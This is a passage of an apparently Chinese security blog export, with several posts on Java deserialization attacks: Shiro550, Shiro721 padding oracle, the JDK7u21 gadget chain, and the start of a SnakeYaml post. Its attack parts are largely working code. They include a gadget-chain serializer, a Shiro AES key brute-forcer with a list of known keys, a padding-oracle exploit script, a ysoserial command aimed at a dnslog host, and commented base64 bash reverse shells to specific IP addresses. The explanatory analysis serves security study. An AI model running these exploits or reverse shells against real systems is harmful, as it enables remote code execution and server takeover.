com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport org.apache.commons.beanutils.BeanComparator;  \nimport org.apache.commons.beanutils.PropertyUtils;  \n  \nimport java.io.*;  \nimport java.lang.reflect.Field;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \nimport java.util.PriorityQueue;  \n  \npublic class CB1EXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        byte[] code = Files.readAllBytes(Paths.get(\"E:\\\\JavaClass\\\\TemplatesBytes.class\"));  \n TemplatesImpl templates = new TemplatesImpl();  \n setFieldValue(templates, \"_name\", \"Calc\");  \n setFieldValue(templates, \"_bytecodes\", new byte[][] &#123;code&#125;);  \n setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl());  \n //    templates.newTransformer();  \n final BeanComparator beanComparator = new BeanComparator();  \n // 创建新的队列，并添加恶意字节码  \n final PriorityQueue&lt;Object> queue = new PriorityQueue&lt;Object>(2, beanComparator);  \n queue.add(1);  \n queue.add(1);  \n  \n // 将 property 的值赋为 outputProperties setFieldValue(beanComparator, \"property\", \"outputProperties\");  \n setFieldValue(queue, \"queue\", new Object[]&#123;templates, templates&#125;);  \n serialize(queue);  \n //    unserialize(\"ser.bin\");  \n &#125;  \n  \n    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;  \n        Field field = obj.getClass().getDeclaredField(fieldName);  \n field.setAccessible(true);  \n field.set(obj, value);  \n &#125;  \n  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n\n我这里遇到的问题是 shiro 版本问题。\n\nyso 中的链子打不通是因为 yso 中 cb 版本为 1.9，而 shiro 自带为 1.8.3\n服务端会显示报错：\n\norg.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc serialVersionUID &#x3D; -2044202215314119608, local class serialVersionUID &#x3D; -3490850999041592962\n\n如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会根据固定算法计算出一个当前类的 serialVersionUID 值，写入数据流中；反序列化时，如果发现对方的环境中这个类计算出的 serialVersionUID 不同，则反序列化就会异常退出，避免后续的未知隐患。\n\nCommons Collections依赖问题\n\n服务端报错：\n\nUnable to load class named [org.apache.commons.collections.comparators.ComparableComparator]\n\n简单来说就是没找到 org.apache.commons.collections.comparators.ComparableComparator 类，从包名即可看出，这个类是来自于commons-collections。\ncommons-beanutils本来依赖于commons-collections，但是在Shiro中，它的commons-beanutils虽然包含了一部分commons-collections的类，但却不全。这也导致，正常使用Shiro的时候不需要依赖于commons-collections，但反序列化利用的时候需要依赖于commons-collections。\n\n0x05 漏洞探测指纹识别在利用 shiro 漏洞时需要判断应用是否用到了 shiro。在请求包的 Cookie 中为 rememberMe 字段赋任意值，收到返回包的 Set-Cookie 中存在 rememberMe=deleteMe 字段，说明目标有使用 Shiro 框架，可以进一步测试。\nAES密钥判断前面说到 Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设 置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。 但是即使升级到了1.2.4以上的版本，很多开源的项目会自己设定密钥。可以收集密钥的集合，或者对密钥进行爆破。\n那么如何判断密钥是否正确呢？文章 一种另类的 shiro 检测方式提供了思路，当密钥不正确或类型转换异常时，目标 Response 包含 Set-Cookie：rememberMe=deleteMe 字段，而当密钥正确且没有类型转换异常时，返回包不存在 Set-Cookie：rememberMe=deleteMe 字段。\n因此我们需要构造 payload 排除类型转换错误，进而准确判断密钥。\nshiro 在 1.4.2 版本之前， AES 的模式为 CBC， IV 是随机生成的，并且 IV 并没有真正使用起来，所以整个 AES 加解密过程的 key 就很重要了，正是因为 AES 使用 Key 泄漏导致反序列化的 cookie 可控，从而引发反序列化漏洞。在 1.4.2 版本后，shiro 已经更换加密模式 AES-CBC 为 AES-GCM，脚本编写时需要考虑加密模式变化的情况。\n这里给出大佬 Veraxy 的脚本：\nimport base64\nimport uuid\nimport requests\nfrom Crypto.Cipher import AES\n \ndef encrypt_AES_GCM(msg, secretKey):\n    aesCipher = AES.new(secretKey, AES.MODE_GCM)\n    ciphertext, authTag = aesCipher.encrypt_and_digest(msg)\n    return (ciphertext, aesCipher.nonce, authTag)\n \ndef encode_rememberme(target):\n    keys = ['kPH+bIxk5D2deZiIxcaaaA==', '4AvVhmFLUs0KTA3Kprsdag==','66v1O8keKNV3TTcGPK1wzg==', 'SDKOLKn2J1j/2BHjeZwAoQ==']     # 此处简单列举几个密钥\n    BS = AES.block_size\n    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()\n    mode = AES.MODE_CBC\n    iv = uuid.uuid4().bytes\n \n    file_body = base64.b64decode('rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==')\n    for key in keys:\n        try:\n            # CBC加密\n            encryptor = AES.new(base64.b64decode(key), mode, iv)\n            base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(file_body)))\n            res = requests.get(target, cookies=&#123;'rememberMe': base64_ciphertext.decode()&#125;,timeout=3,verify=False, allow_redirects=False)\n            if res.headers.get(\"Set-Cookie\") == None:\n                print(\"正确KEY ：\" + key)\n                return key\n            else:\n                if 'rememberMe=deleteMe;' not in res.headers.get(\"Set-Cookie\"):\n                    print(\"正确key:\" + key)\n                    return key\n            # GCM加密\n            encryptedMsg = encrypt_AES_GCM(file_body, base64.b64decode(key))\n            base64_ciphertext = base64.b64encode(encryptedMsg[1] + encryptedMsg[0] + encryptedMsg[2])\n            res = requests.get(target, cookies=&#123;'rememberMe': base64_ciphertext.decode()&#125;, timeout=3, verify=False, allow_redirects=False)\n \n            if res.headers.get(\"Set-Cookie\") == None:\n                print(\"正确KEY:\" + key)\n                return key\n            else:\n                if 'rememberMe=deleteMe;' not in res.headers.get(\"Set-Cookie\"):\n                    print(\"正确key:\" + key)\n                    return key\n            print(\"正确key:\" + key)\n            return key\n        except Exception as e:\n            print(e)\n\n0x06 参考资料Shiro550反序列化漏洞分析 – JohnFrod’s Blog\nShiro反序列化漏洞(一)-shiro550流程分析_哔哩哔哩_bilibili\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化Shiro篇02-Shiro721流程分析","url":"/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/","content":"Shiro721流程分析\n\n0x01 前言本来早该学习的洞，一直拖着了，拖到了现在，发现面试必考，还是想着早补早安心。\n在 Shiro550 漏洞中，Cookie 所使用的 AES 加密密钥为硬编码，所以我们可以构造恶意序列化数据并使用固定的 AES 密钥进行正确加密恶意序列发送给服务端，进而达到攻击的目的。但在该漏洞公布后，Shiro 官方修复了这一漏洞，将AES密钥修改成了动态生成。也就是说，对于每一个 Cookie，都是使用不同的密钥进行加解密的。\n0x02 环境搭建先下载对应的 jar 包 samples-web-1.4.1.war，将 jar 包里面的内容解压一下，samples-web-1.4.1\\WEB-INF\\lib 中的 CommonsCollections 包版本修改为 3.2.1 \n接着新建项目包，选中 web-app 的 maven arch，将 samples-web-1.4.1 的包解压，放到 webapp 文件夹中，项目结构如图\n\n\n再把 WEB-INF\\lib 加入 project structure 中\n\n\n之后再配 Tomcat 即可，如果不想自己搭建环境的话可以用我现成的环境https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/shiro721\n0x03 漏洞复现漏洞利用前提条件漏洞影响版本是 1.2.5 &lt;&#x3D; Apache Shiro &lt;&#x3D; 1.4.1\nApache Shiro Padding Oracle Attack 的漏洞利用必须满足如下前提条件：\n\n开启 rememberMe 功能；\nrememberMe 值使用 AES-CBC 模式解密；\n能获取到正常 Cookie，即用户正常登录的 Cookie 值；\n密文可控；\n\n漏洞复现首先正常登录进去，勾选上 rememberMe 选项：\n\n\n刷新当前页面或访问 /account 页面，获取此时登录成功的 rememberMe 值：\n\n\n使用 ysoserial 工具生成 URLDNS 验证 payload：\njava -jar ysoserial-master-6eca5bc740-1.jar URLDNS &quot;http:&#x2F;&#x2F;5zfnof.dnslog.cn&quot; &gt; payload.class\n\n利用GitHub的exp来进行 Padding Oracle Attack：\n#https://github.com/3ndz/Shiro-721  \n# -*- coding: utf-8 -*-  \nfrom paddingoracle import BadPaddingException, PaddingOracle  \nfrom base64 import b64encode, b64decode  \nfrom urllib import quote, unquote  \nimport requests  \nimport socket  \nimport time  \n  \nclass PadBuster(PaddingOracle):  \n    def __init__(self, **kwargs):  \n        super(PadBuster, self).__init__(**kwargs)  \n        self.session = requests.Session()  \n        self.wait = kwargs.get('wait', 2.0)  \n  \n    def oracle(self, data, **kwargs):  \n        somecookie = b64encode(b64decode(unquote(sys.argv[2])) + data)  \n        self.session.cookies['rememberMe'] = somecookie  \n        if self.session.cookies.get('JSESSIONID'):  \n            del self.session.cookies['JSESSIONID']  \n        while 1:  \n            try:  \n                response = self.session.get(sys.argv[1],  \n                        stream=False, timeout=5, verify=False)  \n                break  \n            except (socket.error, requests.exceptions.RequestException):  \n                logging.exception('Retrying request in %.2f seconds...',  \n                                  self.wait)  \n                time.sleep(self.wait)  \n                continue  \n  \n        self.history.append(response)  \n        if response.headers.get('Set-Cookie') is None or 'deleteMe' not in response.headers.get('Set-Cookie'):  \n            logging.debug('No padding exception raised on %r', somecookie)  \n            return  \n        raise BadPaddingException  \n  \n  \nif __name__ == '__main__':  \n    import logging  \n    import sys  \n  \n    if not sys.argv[3:]:  \n        print 'Usage: %s &lt;url> &lt;somecookie value> &lt;payload>' % (sys.argv[0], )  \n        sys.exit(1)  \n  \n    logging.basicConfig(level=logging.DEBUG)  \n    encrypted_cookie = b64decode(unquote(sys.argv[2]))  \n    padbuster = PadBuster()  \n    payload = open(sys.argv[3], 'rb').read()  \n    enc = padbuster.encrypt(plaintext=payload, block_size=16)  \n    print('rememberMe cookies:')  \n    print(b64encode(enc))\n\n安装脚本不需要 pip install paddingoracle，直接将 GitHub 项目的 paddingoracle.py 放到同目录即可。\n运行该 exp 脚本进行爆破，因为是爆破，所以运行的时间会比较久一些，payload 如下\npython2 exp.py http://192.168.5.3:8081/shiro721_war/account /COGnLcSO/3cUooGdYVDkQQNHrfZTNY+k0BCXPOmA9L+l7MRr3ZRYyuzDWZPNTSUFmFlkZWG+HJcecRLkdAMuxa43+i/hynQP7cYrDiulXmfTbuKmL8oz9DO9pmpUaumyCU0V3xfyLsv0+o3uYK/8Tlh9Ns+TMng3lMenVclDk3pjL/tPL/gfVFz50SMZw67WgdbG4mBzq0URLXG6d9yqB469ruPeKty5q3yjSfWDvOxJcR2OpUJg6dauiJNqwQwsu3FrkPmUlEAwZtQ/EpS9+74Ey5YVNuq350U00Df4ckmmHURCdRi/847d2dSHNQ80Wsoe4IseBOXabm6CBs+mcb4PWptM//E7CDaY6/UwTOm5yzK8/KSa+RNSXhHkOx4CH9wOyh8peq8bexGtoI1CzkqK54QwFkOzCu/bE9VPDU7ylZil3Xlc5oTDy79BHAZXfOgbUcgSSoV6OoOVG1DC6o6ptRYlFT0KBNjwS+ivFtbbA7kxf2Fq9K4tqxC2QI3 payload.class\n\n最终运行成功会给我们一个 rememberMe cookie 去打\n\n\n这里我们将爆破生成的 cookie 替换进原本 /account 界面的 cookie 中去，发包，成功打到 DNS\n当然也可以使用现成的工具 ShiroExploit.V2.51，输入测试网址以及登录用户的 Cookie\n0x04 漏洞分析\n这里相关原理可以看鸿哥写的文章 ———— https://goodapple.top/archives/217我对于漏洞的分析就直接在这基础之上总结一下\n\nPadding Oracle Attack 构造加密数据分析网上讲的文章大多数都是讲的如何使用 Padding Oracle Attack 来获取明文。但是这种场景在 Apache Shiro Padding Oracle Attack 这个漏洞场景中就不适用了。在这个场景中，我们需要构造恶意加密数据，进行解密后反序列化。\n此处内容参考自 https://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89\n这里简单说下 Padding Oracle Attack 加密数据整体过程：\n\n选择一个明文 P，用来生成你想要的密文C；\n使用适当的 Padding 将字符串填充为块大小的倍数，然后将其拆分为从 1 到 N 的块；\n生成一个随机数据块（C[n] 表示最后一个密文块）；\n对于每一个明文块，从最后一块开始：\n创建一个包括两块的密文C’，其是通过一个空块（00000…）与最近生成的密文块C[n+1]（如果是第一轮则是随机块）组合成的；\n这步容易理解，就是Padding Oracle的基本攻击原理：修改空块的最后一个字节直至Padding Oracle没有出现错误为止，然后继续将最后一个字节设置为2并修改最后第二个字节直至Padding Oracle没有出现错误为止，依次类推，继续计算出倒数第3、4…个直至最后一个数据为止；\n在计算完整个块之后，将它与明文块 P[n] 进行XOR一起创建 C[n]；\n对后续的每个块重复上述过程（在新的密文块前添加一个空块，然后进行Padding Oracle爆破计算）；\n\n\n\n简单地说，每一个密文块解密为一个未知值，然后与前一个密文块进行XOR。通过仔细选择前一个块，我们可以控制下一个块解密来得到什么。即使下一个块解密为一堆无用数据，但仍然能被XOR化为我们控制的值，因此可以设置为任何我们想要的值。\n漏洞代码分析密钥生成在 Shiro550 中，密钥是硬编码，就像下面这样\npublic AbstractRememberMeManager() &#123;\n        this.serializer = new DefaultSerializer&lt;PrincipalCollection>();\n        this.cipherService = new AesCipherService();\n        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);\n    &#125;\n\n而在 Shiro721 中，密钥的生成方式变为了动态生成\npublic AbstractRememberMeManager() &#123;\n        this.serializer = new DefaultSerializer&lt;PrincipalCollection>();\n        AesCipherService cipherService = new AesCipherService();\n        this.cipherService = cipherService;\n        setCipherKey(cipherService.generateNewKey().getEncoded());\n    &#125;\n\n我们可以跟进调试一下，断点下在 org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey() 下，shiro 通过 generateNewKey() 方法获取密钥，跟进\n\n\n这里获取到了一个随机数生成器 SecureRandom， 跟进 init()\n\n\n往下看，这里 var4 是 AESKeyGenerator，跟进 engineInit() 方法，进行了 AES 算法的初始化。\n\n\n\n\n回到 org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey()，跟进 generateKey() 方法\n\n\n这里需要手动在 com.sun.crypto.provider.AESKeyGenerator#engineGenerateKey() 方法下个断点，不然不会停在这里。\n\n\n可见这里已经生成了一串16字节的随机序列，并且返回一个 SecretKeySpec 对象，再使用getEncoded() 方法获取 key 密钥序列。\n\n\n至此就是 Shiro721 完整的密钥生成过程。\n在 shiro721 中的 Padding Oracle Attack要成功进行 Padding Oracle Attack 是需要服务端返回两个不同的响应特征来进行 Bool 判断的。\n在 Apache Shiro 的场景中，这个服务端的两个不同的响应特征为：\n\nPadding Oracle 错误时，服务端响应报文的 Set-Cookie 头字段返回 rememberMe=deleteMe；\nPadding Oracle 正确时，服务端返回正常的响应报文内容；\n\n我们可以通过响应头来判断明文填充是否正确，进而爆破出中间值。那么对于解密不正确的 Cookie，Shiro 是怎么处理的呢？\nPadding 错误处理解密函数在 org.apache.shiro.mgt.AbstractRememberMeManager#decrypt() 中\n\n\n跟进 cipherService.decrypt()，最后到 crypt() 中调用 doFinal() 方法\n\n\n\n\ndoFinal() 方法有 IllegalBlockSizeException和BadPaddingException 这两个异常，分别用于捕获块大小异常和填充错误异常。异常会被抛出到 crypt() 方法中，最终被 getRememberedPrincipals() 方法捕获，并执行 onRememberedPrincipalFailure() 方法。\n\n\nonRememberedPrincipalFailure() 方法调用了 forgetIdentity()。在 Shiro550 中我们分析过，该方法会调用 removeFrom()，并且会在response头部添加字段 Set-Cookie: rememberMe=deleteMe\n\n\n倘若Padding结果不正确的话，响应包就会返回 Set-Cookie: rememberMe=deleteMe 。\nPadding正确，反序列化处理CBC模式下的分组密码，如果某一组的密文被破坏，那么在其之后的分组都会受到影响。这时候我们的密文就无法正确的被反序列化了。\nShiro中关于反序列化的处理在 org.apache.shiro.io.DefaultSerializer#deserialize() 方法下\n\n\n如果反序列化的结果错误，则会抛出异常。最后异常仍会被 getRememberedPrincipals() 方法处理。这也就是上面讲的 response 包里会回显 302 且 rememberMe=deleteMe\n但是对于 Java 来说，反序列化是以 Stream 的方式按顺序进行的，向其后添加或更改一些字符串并不会影响正常反序列化。我们可以来测试一下。\n我们获取正常用户的 Cookie 并使用密钥解密，可以看到最后填充的数据为 0x0B\n\n\n下面我们将其更改为其他合法填充方式，然后加密发送出去\n\n\n\n\n服务器端正常响应，于是这里就构造出了布尔条件\n\nPadding 正确，服务器正常响应\nPadding 错误，服务器返回 Set-Cookie: rememberMe=deleteMe\n\n0x05 小结感觉从利用上来说并不算是一个很好打的漏洞，不过还是拓展了一条 CBC 攻击的路线。\n0x06 Referencehttps://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89/https://goodapple.top/archives/261\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化之 JDK7u21 原生链","url":"/2023/03/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-JDK7u21-%E5%8E%9F%E7%94%9F%E9%93%BE/","content":"JDK7u21-原生链\n\n0x01 前言发现自己还没有看过这条链子，趁着开发写疲的时候看一看其他链子，并且复现一些其它漏洞\n在前面分析的利用链中，其实大致都差不多都是基于 InvokerTransformer 和 TemplatesImpl 这两个类去进行执行命令，而其他的一些利用链也是基于这两个去进行一个变型。从而产生了新的利用链。而在这个 Jdk7u21 链中也是基于 TemplatesImpl 去实现的。\n0x02 环境搭建因为是 jdk7u21 的原生链子，所以直接搭建 jdk7u21 的环境包即可，不需要配上 CC 这一些的依赖了。\n0x03 链子分析&#x2F;复现分析 yso先来看一下该利用链的在 yso 里面给出调用链\nLinkedHashSet.readObject()\n  LinkedHashSet.add()\n    ...\n      TemplatesImpl.hashCode() (X)\n  LinkedHashSet.add()\n    ...\n      Proxy(Templates).hashCode() (X)\n        AnnotationInvocationHandler.invoke() (X)\n          AnnotationInvocationHandler.hashCodeImpl() (X)\n            String.hashCode() (0)\n            AnnotationInvocationHandler.memberValueHashCode() (X)\n              TemplatesImpl.hashCode() (X)\n      Proxy(Templates).equals()\n        AnnotationInvocationHandler.invoke()\n          AnnotationInvocationHandler.equalsImpl()\n            Method.invoke()\n              ...\n                TemplatesImpl.getOutputProperties()\n                  TemplatesImpl.newTransformer()\n                    TemplatesImpl.getTransletInstance()\n                      TemplatesImpl.defineTransletClasses()\n                        ClassLoader.defineClass()\n                        Class.newInstance()\n                          ...\n                            MaliciousClass.&lt;clinit>()\n                              ...\n                                Runtime.exec()\n\n从这里其实可以看到JDK 7u21的这条链相对来说，比前面的链需要的知识量要大一些，分析得也会比较绕。但是其实到了 TemplatesImpl.getOutputProperties 这一步其实也是和前面的相同。\n并且看到里面用到了 Proxy 这个代理类，说明这条链子可能是需要用到动态代理来实现的\n\n我们正式开始进行漏洞分析，先从链尾看起，链尾是 TemplatesImpl.getOutputProperties() 方法，find usages 一下\n\n\n\n这里的链子如果跟上去的话会发现跟不动，那么这里我们就要思考用两种办法来触发这条链子。\n方法一、自动调用 getOutputProperties() 方法，一般是某个 set 自动调用 getOutputProperties() 方法\n方法二、通过动态代理的方式触发 getOutputProperties() 方法\n在这里 yso 给了我们答案 ———— 通过动态代理的方式进行触发，并且此处的动态代理为 Templates 类（这个其实是因为后面会去到它的实现类 TemplatesImpl 去，然后操作空间就很大了）\n\n然后这里想了很久，我感觉自己还是有些基础的地方掌握的不够好，导致 EXP 可能只能写个一知半解这样。还是决定半看别人的，一半自己构造\n\n独立编写 EXPyso 这里告诉我们，链首是 LinkedHashSet 这个类，中间的步骤有：LinkedHashSet.add() 与 String.hashCode()，最后才是走到了 Proxy(Templates).equals()，接着就是熟悉的调用 Templates 的实现类 —— TemplatesImpl 了。\n看到这里我直接悟了，String.hashCode() 里面的这个 String 是 LinkedHashSet 的键值对，调用了 String.hashCode() 方法之后，会自动调用 Proxy(Templates).equals()\n\n所以归根结底，要编写 EXP，要先去看一下这个反序列化的入口 LinkedHashSet 类\n\n\n\nLinkedHashSet 类的父类其实就是 HashSet 类，在 HashSet 类中提供了一个反序列化的入口方法 readObject()；接着我们看一下 HashSet 类的构造函数\n\n\n其中有一个构造函数很特殊，里面可以键值对可以是泛型，也就是放对象进去了，所以这一步 LinkedHashSet.add() 放进去的有一个参数肯定是代理类。\n我们现在还需要触发 String.hashCode() 以及 Proxy(Templates).equals()，后面的 Proxy(Templates).equals() 最好是被自动触发，那么这一步是怎么做到的呢\n这一段话摘自 Y4tacker 师傅的文章，我也是看了这段话就懂了\n\n在 readObject() 恢复对象的时候，因为 set 中储存的对象不允许重复，所以在添加对象的时候，势必会涉及到比较操作\n如果 set 当中两个对象 hashCode 相同，则会对 key 调用 equals() 方法，如果我们用AnnotationInvocationHandler 代理一个对象，在调用 equals() 方法触发 invoke() 时，会调用 equalsImpl 方法，这里面会遍历 type(设置为 TemplateImpl 类) 中的每个方法并调用，那么就会触发 newTransform() 或 getOutputProperties() 方法导致字节码加载任意代码的执行\n\n这里因为 hashCode 是可控，所以才会想到用代理类来实现我们的攻击，这里实在是太妙了。如此一来，其实我们已经可以自己手写 EXP 了\n\n在这之前，可以再画个流程图让自己思路更清晰一点\n\n\n\n先添加依赖\n&lt;dependencies>  \n  &lt;dependency>  \n    &lt;groupId>org.javassist&lt;/groupId>  \n    &lt;artifactId>javassist&lt;/artifactId>  \n    &lt;version>3.18.2-GA&lt;/version>  \n  &lt;/dependency>  \n  \n  &lt;dependency>  \n    &lt;groupId>org.jboss.classpool&lt;/groupId>  \n    &lt;artifactId>jboss-classpool&lt;/artifactId>  \n    &lt;version>1.0.0.GA&lt;/version>  \n  &lt;/dependency>  \n&lt;/dependencies>\n\n构造 EXP 如下\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport javassist.ClassPool;  \nimport javassist.CtClass;  \nimport javassist.CtConstructor;  \n  \nimport javax.xml.transform.Templates;  \nimport java.io.*;  \nimport java.lang.reflect.Constructor;  \nimport java.lang.reflect.Field;  \nimport java.lang.reflect.InvocationHandler;  \nimport java.lang.reflect.Proxy;  \nimport java.util.*;  \n  \npublic class exp &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        TemplatesImpl templates = new TemplatesImpl();  \n        setFieldValue(templates, \"_name\", \"Drunkbaby\");  \n        setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl());  \n        // new String[]&#123;\\\"/bin/bash\\\", \\\"-c\\\", \\\"&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzkuMC4xNjQvMTIzNiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\\\"&#125;\"  \n        byte[] evil = getTemplatesImpl(\"Calc\");  \n        byte[][] codes = &#123;evil&#125;;  \n        setFieldValue(templates, \"_bytecodes\", codes);  \n  \n        String evilHashCode = \"f5a5a608\";  \n        // 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值  \n        HashMap hashMap = new HashMap();  \n        hashMap.put(evilHashCode,\"Drunkbaby\");  \n  \n        // 下面部分搞动态代理，反射获取 AnnotationInvocationHandler 类，再实例化  \n  \n        Class handler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");  \n        Constructor constructor = handler.getDeclaredConstructor(Class.class, Map.class);  \n        constructor.setAccessible(true);  \n        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Templates.class, hashMap);  \n  \n        // 创建动态代理  \n  \n        Templates proxy = (Templates) Proxy.newProxyInstance(exp.class.getClassLoader(),  \n                                                            new Class[]&#123;Templates.class&#125;, invocationHandler);  \n  \n        // 准备入口类 LinkedHashSet  \n        HashSet hashSet = new LinkedHashSet();  \n        hashSet.add(templates);  \n        hashSet.add(proxy);  \n  \n        // 将恶意templates设置到map中  \n        hashMap.put(evilHashCode, templates);  \n        serialize(hashSet);  \n        deserialize(\"ser.bin\");  \n    &#125;  \n  \n    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;  \n        Field field = obj.getClass().getDeclaredField(fieldName);  \n        field.setAccessible(true);  \n        field.set(obj, value);  \n    &#125;  \n  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n        oos.writeObject(obj);  \n    &#125;  \n  \n    public static Object deserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n        Object obj = ois.readObject();  \n        return obj;  \n    &#125;  \n  \n    public static byte[] getTemplatesImpl(String cmd) &#123;  \n        try &#123;  \n            ClassPool pool = ClassPool.getDefault();  \n            CtClass ctClass = pool.makeClass(\"Evil\");  \n            CtClass superClass = pool.get(\"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\");  \n            ctClass.setSuperclass(superClass);  \n            CtConstructor constructor = ctClass.makeClassInitializer();  \n            constructor.setBody(\" try &#123;\\n\" +  \n                    \" Runtime.getRuntime().exec(\\\"\" + cmd +  \n                    \"\\\");\\n\" +  \n                    \" &#125; catch (Exception ignored) &#123;\\n\" +  \n                    \" &#125;\");  \n            // \"new String[]&#123;\\\"/bin/bash\\\", \\\"-c\\\", \\\"&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMC4xMS4yMzEvOTk5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\\\"&#125;\"  \n            byte[] bytes = ctClass.toBytecode();  \n            ctClass.defrost();  \n            return bytes;  \n        &#125; catch (Exception e) &#123;  \n            e.printStackTrace();  \n            return new byte[]&#123;&#125;;  \n        &#125;  \n    &#125;  \n&#125;\n\n\n\n0x04 调试简单的看一看吧，虽然流程已经很清晰了，主要是想调试再看一看中间比较细致的部分。断点下在 HashSet.readObject() 处，开始调试\n\n\n到第 309 行，跟进 put() 方法，跟进的是 HashMap.put() 方法，这里是因为 map 在最开始被定义的时候就是 HashMap 类。继续往下\n\n\n此处会跨过for 的代码块，执行下面的代码。因为 table 值是空的，这里就没法进行遍历。继续跟进 addEntry() 方法\naddEntry(hash, key, value, i);\n\n这里是 TemplatesImpl 的 hash 值。key 为 TemplatesImpl 的实例对象，value 则是一个空的 Object 对象，i 变量为 indexFor() 方法处理 hash 后的结果\n\n\n在第一次进行 for 循环将值 put 进去之后，第二次再拿出来时，table 就不为空，能够让代码逻辑走到 for 循环里面\n\n第二次循环\n\n\n\ntable 不为空，进入到调用 equals() 的循环里面\n\n\n跟进 k.equls()，发现直接进了 AnnotationInvocationHandler#invoke()，也就是进行了动态代理的调用\n\n\n跟进 this.equalsImpl()，实际上逻辑在这里已经差不多很清晰了，去取出 TemplatesImpl 的诸多方法，进行循环遍历\n\n\n\n\n正式调用了 TemplatesImpl.getOutputProperties()，经过一连串的 invoke 方法，这里很明显其实是通过反射的方式在调用，最后是调用了 newTransformer().getOutputProperties()\n\n\n后续就很简单了，这里不再调试\n\n\n0x05 小结比较简单的一条链子，核心在于 readObject() 之后去比较的操作，以及如果 hashCode 相同，自动调用 equals() 方法这里，如果一开始不知道的话比较困难。\n动态代理的思想在这一条链子里体现的淋漓尽致。\n0x06 Referencehttps://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Jdk7u21.java\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化之 SnakeYaml 链","url":"/2022/10/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-SnakeYaml-%E9%93%BE/","content":"Java SnakeYaml 链\n\nJava 反序列化之 SnakeYaml 链0x01 前言最近感觉各大 CTF 比赛里面都很喜欢出这条 SnakeYaml 的链子，今天就来看一看这条链子。看了一些基础内容，发现和 Python  Pickle 反序列化比较相似，可能 Pickle 反序列化的懒癌也必须要解决了呜呜\n0x02 Yaml 基础Yaml 语法\n比较基础的内容，简单过一遍。\n\nSnakeYaml 是 Java 的 yaml 解析类库，支持 Java 对象的序列化&#x2F;反序列化，在反序列化的基础第一篇文章里面我就有说 Yaml 也是序列化&#x2F;反序列化的一种协议；我们先了解一下 yaml 语法\n\nYAML 大小写敏感；\n使用缩进代表层级关系，这点和 properties 文件的差别非常之大\n缩进只能使用空格，不能使用 TAB，不要求空格个数，只需要相同层级左对齐（一般2个或4个空格）\n\nYAML 支持三种数据结构：\n1、对象\n使用冒号代表，格式为 key: value 。冒号后面要加一个空格：\nkey: value\n\n可以使用缩进表示层级关系：\nkey: \n    child-key: value\n    child-key2: value2\n\n2、数组\n使用一个短横线加一个空格代表一个数组项：\nhobby:\n    - Java\n    - LOL\n\n3、常量\nYAML中提供了多种常量结构，包括：整数，浮点数，字符串，NULL，日期，布尔，时间。下面使用一个例子来快速了解常量的基本使用：\nboolean: \n    - TRUE  #true,True都可以\n    - FALSE  #false，False都可以\nfloat:\n    - 3.14\n    - 6.8523015e+5  #可以使用科学计数法\nint:\n    - 123\n  